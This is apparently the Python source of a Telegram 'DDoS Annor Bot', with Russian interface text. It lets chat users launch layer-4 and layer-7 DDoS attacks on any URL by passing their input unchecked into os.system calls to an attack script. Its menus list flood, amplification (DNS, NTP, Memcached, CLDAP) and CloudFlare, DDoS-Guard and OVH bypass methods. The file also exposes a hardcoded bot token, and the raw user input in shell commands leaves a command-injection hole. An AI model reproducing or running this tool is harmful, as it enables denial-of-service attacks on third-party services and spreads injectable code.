import os
import telebot
from telebot import types

token = "5675173168:AAFQlo5i7w2zsXgrjJW6Z-qvMsywqT_m04Q"
bot = telebot.TeleBot(token, parse_mode=None)

methodsl7 = """Все методы DDOS-Атак L7
💣 Layer7

🪬 GET | GET Flood
🪬 POST | POST Flood
🎭 OVH | Bypass OVH
🎲 RHEX | Random HEX
🎭 STOMP | Bypass chk_captcha
💘 STRESS | Send HTTP Packet With High Byte
🏠 DYN | A New Method With Random SubDomain
🏇 DOWNLOADER | A New Method of Reading data slowly
🦥 SLOW | Slowloris Old Method of DDoS
💀 HEAD | https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/HEAD
🎭 NULL | Null UserAgent and ...
🍪 COOKIE | Random Cookie PHP 'if (isset($_COOKIE))'
🧩 PPS | Only 'GET / HTTP/1.1\r\n\r\n'
🪬 EVEN | GET Method with more header
🪩 GSB | Google Project Shield Bypass
🌩️ DGB | DDoS Guard Bypass
🌩️ AVB | Arvan Cloud Bypass
🤖 BOT | Like Google bot
🧫 APACHE | Apache Expliot
📋 XMLRPC | WP XMLRPC expliot (add /xmlrpc.php)
☁️ CFB | CloudFlare Bypass
☁️ CFBUAM | CloudFlare Under Attack Mode Bypass
🎭 BYPASS | Bypass Normal AntiDDoS
💣 BOMB | Bypass with codesenberg/bombardier
🔪 KILLER | run many threads to kill a target
🧅 TOR | Bypass onion website
"""
methodsl4 = """Все методы DDOS-Атак L4
🧨 Layer4:

🪬 TCP | TCP Flood Bypass
🪬 UDP | UDP Flood Bypass
🪬 SYN | SYN Flood
🪬 CPS | Open and close connections with proxy
🎭 ICMP | Icmp echo request flood (Layer3)
🏇 CONNECTION | Open connection alive with proxy
🏇 VSE | Send Valve Source Engine Protocol
 TS3 | Send Teamspeak 3 Status Ping Protocol
🪩 FIVEM | Send Fivem Status Ping Protocol
☁️ MEM | Memcached Amplification
🪬 NTP | NTP Amplification
🤖 MCBOT | Minecraft Bot Attack
🤖 MINECRAFT | Minecraft Status Ping Protocol
🤖 MCPE | Minecraft PE Status Ping Protocol
🏠 DNS | DNS Amplification
🌩️ CHAR | Chargen Amplification
☁️ CLDAP | Cldap Amplification
💻 ARD | Apple Remote Desktop Amplification
🖥️ RDP | Remote Desktop Protocol Amplification
"""

@bot.message_handler(commands=['start'])
def start (message):
    bot.reply_to(message, "Добро пожаловать!\nНапишите /help")
# хэлпа
@bot.message_handler(commands=['help'])
def help (message):
    bot.reply_to(message, "Добро пожаловать в DDoS Annor Bot:\n /ddos4 - DDOS-Атака методами L4.\n /ddos7 - DDOS-Атака методами L7.\n /methods - Показать все методы атак. \n /help - Все команды \n /author - author of bot")
#методы атак
@bot.message_handler(commands=['methods'])
def methods(message):
    markup = telebot.types.InlineKeyboardMarkup()
    btn_l7 = telebot.types.InlineKeyboardButton(text='L7', callback_data='l7')
    btn_l4 = telebot.types.InlineKeyboardButton(text='L4', callback_data='l4')
    markup.row(btn_l7, btn_l4)
    bot.send_message(message.chat.id, 'Выберите метод:', reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if call.data == 'l7':
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=methodsl7, reply_markup=call.message.reply_markup)
    elif call.data == 'l4':
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=methodsl4, reply_markup=call.message.reply_markup)


# ддосная часть
@bot.message_handler(commands=['ddos7'])
def handle_ddos7(message):
    global url, thread_bot, duration_bot
    try:
        # Разбиваем сообщение пользователя на три части
        command_parts = message.text.split()
        if len(command_parts) == 5:
            method = command_parts[1]
            url = command_parts[2]
            thread_bot = int(command_parts[3])
            duration_bot = int(command_parts[4])
            # добавляем кнопку для остановки атаки
            markup = telebot.types.InlineKeyboardMarkup()
            btn_screen = telebot.types.InlineKeyboardButton(text='Screen', callback_data='scren')
            markup.add(btn_screen)
            btn_stop = telebot.types.InlineKeyboardButton(text='Остановить DDoS', callback_data='stop_ddos')
            markup.add(btn_stop)
            bot.reply_to(message, "DDoS L7 Started!", reply_markup=markup)
            os.system(f"python3 start.py {method} {url} 0 {thread_bot} http.txt 10000 {duration_bot}")

        else:
            # Отправляем сообщение об ошибке, если сообщение пользователя некорректно
            bot.reply_to(message, "Пожалуйста, введите данные в формате: /ddos7 method url thread_bot duration_bot")
    except Exception as e:
        if str(e) == 'Ваша_ошибка':
            bot.send_message(message.chat.id, 'Повторите попытку')
        else:
            markup = telebot.types.InlineKeyboardMarkup()
            btn_support = telebot.types.InlineKeyboardButton(text='Свяжитесь с технической поддержкой', url='https://t.me/kazakhstanadm')
            markup.add(btn_support)
            bot.send_message(message.chat.id, 'Произошла ошибка. Пожалуйста, свяжитесь с технической поддержкой', reply_markup=markup)

#l4
@bot.message_handler(commands=['ddos4'])
def handle_ddos4(message):
    global url, thread_bot, duration_bot

    try:
        # Разбиваем сообщение пользователя на три части
        command_parts = message.text.split()
        if len(command_parts) == 5:
            method = command_parts[1]
            url = command_parts[2]
            thread_bot = int(command_parts[3])
            duration_bot = int(command_parts[4])
            # добавляем кнопку для остановки атаки
            markup = telebot.types.InlineKeyboardMarkup()
            btn_screen = telebot.types.InlineKeyboardButton(text='Screen', callback_data='scren')
            markup.add(btn_screen)
            btn_stop = telebot.types.InlineKeyboardButton(text='Остановить DDoS', callback_data='stop_ddos')
            markup.add(btn_stop)
            bot.reply_to(message, "DDoS L4 Started!", reply_markup=markup)
            os.system(f"python3 start.py {method} {url} {thread_bot} {duration_bot}")
        else:
            # Отправляем сообщение об ошибке, если сообщение пользователя некорректно
            bot.reply_to(message, "Пожалуйста, введите данные в формате: /ddos4 method url thread_bot duration_bot")
    except Exception as e:
        if str(e) == 'Ваша_ошибка':
            bot.send_message(message.chat.id, 'Повторите попытку')
        else:
            markup = telebot.types.InlineKeyboardMarkup()
            btn_support = telebot.types.InlineKeyboardButton(text='Свяжитесь с технической поддержкой', url='https://t.me/kazakhstanadm')
            markup.add(btn_support)
            bot.send_message(message.chat.id, 'Произошла ошибка. Пожалуйста, свяжитесь с технической поддержкой', reply_markup=markup)

#ддос отключитель
@bot.callback_query_handler(func=lambda call: call.data == 'stop_ddos')
def stop_ddos(callback_query):
    # останавливаем DDoS атаку
    os.system('pkill python3')
    bot.answer_callback_query(callback_query.id, text='DDoS остановлен!')

@bot.message_handler(commands=['screen'])
async def handle_screen(message):
    url = message.text.split()[1]  # получаем ссылку на сайт из команды
    options = webdriver.ChromeOptions()
    options.add_argument('headless')  # скрываем браузер
    driver = webdriver.Chrome(options=options)  # создаем экземпляр браузера
    driver.get(url)  # открываем сайт
    driver.save_screenshot('screenshot.png')  # делаем скриншот и сохраняем его в файл
    driver.quit()  # закрываем браузер
    with open('screenshot.png', 'rb') as f:
        bot.send_photo(message.chat.id, f)  # отправляем скриншот пользователю

@bot.callback_query_handler(func=lambda call: call.data == 'scren')
def handle_screen_callback(call):
    # Создаем скриншот и сохраняем его в файл
    options = webdriver.ChromeOptions()
    options.add_argument('headless')  # скрываем браузер
    driver = webdriver.Chrome(options=options)
    driver.get(url)
    driver.save_screenshot('screenshot.png')
    driver.quit()

    # Отправляем скриншот пользователю
    with open('screenshot.png', 'rb') as f:
        media = telebot.types.InputMediaPhoto(f)
        bot.edit_message_media(media=media, chat_id=call.message.chat.id, message_id=call.message.message_id)


# Команда /author
@bot.message_handler(commands=['author'])
def author (message):
    bot.reply_to(message, "TG: @kazakhstanadm\nDiscord: HFMFH#2764\n\nПоддержите нас напишите нам и попросите кошелёк btc/eth/карта и т.д для доната!")
        

bot.polling(none_stop=True)
